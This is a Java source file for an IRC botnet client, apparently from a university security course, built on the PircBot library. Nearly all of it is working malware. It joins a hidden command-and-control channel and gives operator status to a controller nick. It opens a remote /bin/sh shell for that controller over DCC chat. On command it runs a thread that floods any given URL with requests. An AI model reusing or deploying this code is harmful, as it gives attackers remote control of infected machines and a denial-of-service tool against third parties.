import java.io.*;
import java.net.*;
import java.util.*;

import org.jibble.pircbot.*;

public class BotnetClient extends PircBot {
	private static final String[] COMMANDS = {"shell", "ddos", "spam", "lease"};
	private static final String[] LEASE_COMMANDS = {"ddos", "spam"};
	
	private static final String SENTINEL = "$: ";
	private static final String TERMINATION = "exit";
	private static final boolean DEBUG = true;
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "bot";
	private static final String CC = "RandR";
	private static final int PORT = 6667;
	private String uuid;
	private String id;
	private String operator;
	
	public static void main(String[] args) {
		BotnetClient bn = new BotnetClient();
	}
	
	public BotnetClient() {
		//MsgEncrypt cipher = MsgEncrypt.getInstance(key, secretKey);
		uuid = UUID.randomUUID().toString();
		id = NAME + "_" + uuid;
		try {
			setVerbose(DEBUG);
			setName(id);
			setMessageDelay(0);
			connect(SERVER, PORT);
			joinChannel(CHANNEL);
			setMode(CHANNEL, "+s");
		} catch (NickAlreadyInUseException e) {
			uuid = UUID.randomUUID().toString();
			id = NAME + "_" + uuid;
			changeNick(id);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
		
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		if (message.toLowerCase().startsWith("spam")) {
			System.out.println("Sending Spam");
		} else if (message.toLowerCase().startsWith("ddos")) {
			System.out.println(sender + ": " + message);
			String[] parts = message.split(" ");
			if (parts.length < 3) {
				System.out.println("Bad ddos message provided");
			} else {
				DdosThread ddos = new DdosThread(parts[0], Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
			}
		} else if (message.toLowerCase().startsWith("lease")) {
			System.out.println("Leasing Myself");
		} else {
			System.out.println("<" + sender + ">: " + message);
		}
	}
	
	protected void onOp(String channel, String sourceNick, String sourceLogin, String sourceHostname, String recipient) {
		operator = recipient;
	}
	
	protected void onJoin(String channel, String sender, String login, String hostname) {
		if (sender.equals(CC)) {
			op(CHANNEL, sender);
			deOp(CHANNEL, id);
			System.out.println("Operator status given to " + CC);
		}
	}
	

	protected void onIncomingChatRequest(DccChat chat) {
		if (chat == null) {
			System.out.println("Chat failed, passed null.");
		} else {
			try {
				if (!chat.getNick().equalsIgnoreCase(CC)) {
					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
				} else {
					chat.accept();
					
					//Create the bash shell
					Runtime r = Runtime.getRuntime();
					Process p = r.exec("/bin/sh");

					//Gather the input/output stream to the bash shell process
					PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
					BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
					BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
					
					//Send input commands to the process in a separate thread
					ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
					inputThread.start();
					
					ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
					errorThread.start();
					
		        	//print the results only
	        		while (inputThread.isAlive()) {
	        			String s = bashout.readLine();
	        			while (s != null && !s.equals(SENTINEL)) {
	        				chat.sendLine(s);
	        				System.out.println("bash response: " + s);
	        				s = bashout.readLine();
	        			}
	        			chat.sendLine(s);
	        		}
		        	chat.close();
		        	inputThread.kill();
		        	errorThread.kill();
		        	p.destroy();
				    System.out.println("Closed the bash shell");
				}
			} catch(Exception e) {
				System.out.println(e.getMessage());
			}
		}
	}
	
	//This class performs a ddos attack against the specified url
	private class DdosThread extends Thread {
		private URL url;
		private long duration;
		private long interval;
		private boolean terminate;
		
		public DdosThread(String url, int interval, int duration) {
			this.duration = duration * 1000;
			this.interval = interval * 1000;
			terminate = false;
			try {
				this.url = new URL(url);
				this.start();
			} catch (Exception e) {
				System.out.println("Malformed URL string");
			}
		}
		public void kill() {
			terminate = true;
		}
		public void run() {
			int times = (int)(Math.round(duration * 1.0 / interval));
			int performed = 0;
			long sleeptime = (long)(Math.round(duration * 1.0 / times));
			while (!terminate && performed < times) {
				try {
					url.getContent();
					DdosThread.sleep(sleeptime);
				} catch (InterruptedException e) {
					System.out.println(e.getMessage());
				} catch (Exception e) {
					System.out.println("There was a problem connecting to " + url.toString());
				}
				performed++;
			}
		}
	}
	
	//This class passes input from the chat object (the master bot) to the bash shell
	private class ProcessInputThread extends Thread {
		private static final String TERMINATION = "exit";
	    private DccChat chat;
	    private PrintWriter bashin;
	    private boolean terminate;
	    
	    public ProcessInputThread(DccChat chat, PrintWriter writer) {
	        this.chat = chat;
	        bashin = writer;
	        terminate = false;
	    }
	    
	    public void kill() {
	    	terminate = true;
	    }

	    public void run() {
	    	try {
	    		bashin.println("echo `pwd` '$: '");
		    	String command = chat.readLine();
	        	while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
	        		System.out.println("command: " + command);
	        		bashin.println(command);
	        		bashin.println("echo `pwd` '$: '");
	        		command = chat.readLine();
	        	}
	        	bashin.println("exit 0");
	    	} catch (Exception e) {
	            System.out.println(e.getMessage());
	        }
	    	System.out.println("Done feeding output from the bash shell to the master bot");
	    }
	}
	
	//This class passes error output from the bash shell to the chat object (the master bot)
	private class ProcessErrorThread extends Thread {
	    private DccChat chat;
	    private BufferedReader bashin;
	    private boolean terminate;
	    
	    public ProcessErrorThread(DccChat chat, BufferedReader writer) {
	        this.chat = chat;
	        bashin = writer;
	        terminate = false;
	    }
	    
	    public void kill() {
	    	terminate = true;
	    }

	    public void run() {
	    	try {
	    		String s = "";
	        	while (s != null && bashin.ready() && !terminate) {
	        		s = bashin.readLine();
	        		System.out.println("error: " + s);
	        		chat.sendLine(s);
	        	}
	    	} catch (Exception e) {
	            System.out.println(e.getMessage());
	        }
	    	System.out.println("Done feeding error output from the bash shell to the master bot");
	    }
	}
}